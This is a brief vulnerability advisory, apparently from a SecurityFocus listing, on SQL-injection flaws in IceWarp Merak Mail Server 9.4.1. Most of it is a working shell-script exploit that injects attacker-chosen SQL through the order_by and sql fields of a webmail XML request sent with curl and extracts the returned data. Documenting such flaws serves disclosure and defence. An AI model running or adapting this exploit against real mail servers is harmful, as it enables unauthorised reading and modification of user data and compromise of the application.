source: http://www.securityfocus.com/bid/34820/info

IceWarp Merak Mail Server is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

IceWarp Merak Mail Server 9.4.1 is affected; other versions may be vulnerable as well. 

#!/bin/sh

sid=$1
uid=$2
orderby=$3
if [ -n "$4" ] ; then
    sql=$4
else
    sql="1=0)/*"
fi
curl --silent -d '<iq sid="'$sid'" type="get" format="json">
  <query xmlns="webmail:iq:items">
    <account uid="'$uid'">
      <folder uid="Files">
        <item><values><evntitle></evntitle></values>
          <filter><offset></offset><limit></limit>
            <order_by>'"$orderby"'</order_by>
            <sql>'"$sql"'</sql>
          </filter>
        </item>
      </folder>
    </account>
  </query>
</iq>' https://example.com/webmail/server/webmail.php | \
perl -pe 's/{/\n/g' | grep "result::" | \
sed -e 's/^"VALUE":"result:://' -e 's/"}]}],"ATTRIBUTES":$//'